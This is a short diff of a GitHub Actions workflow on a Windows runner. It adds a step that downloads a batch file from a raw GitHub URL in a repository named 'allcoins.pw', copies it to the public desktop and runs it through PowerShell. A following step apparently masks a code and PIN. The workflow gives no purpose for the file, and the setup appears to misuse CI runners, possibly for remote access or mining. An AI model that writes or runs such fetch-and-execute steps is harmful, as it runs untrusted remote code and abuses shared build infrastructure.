@@ -22,11 +22,10 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: auto
-      run:
+      run: |
         Invoke-WebRequest https://raw.githubusercontent.com/redsunday/allcoins.pw/master/file/a.bat -OutFile a.bat
         copy "a.bat" "C:\Users\Public\Desktop\a.bat"
-    - name: auto 2
-      run: Start-Process Powershell -ArgumentList '-Noexit -Command "C:\Users\Public\Desktop\a.bat"'
+        Start-Process Powershell -ArgumentList '-Noexit -Command "C:\Users\Public\Desktop\a.bat"'
     - name: Mask Code & Pin.
       shell: bash
       run: |
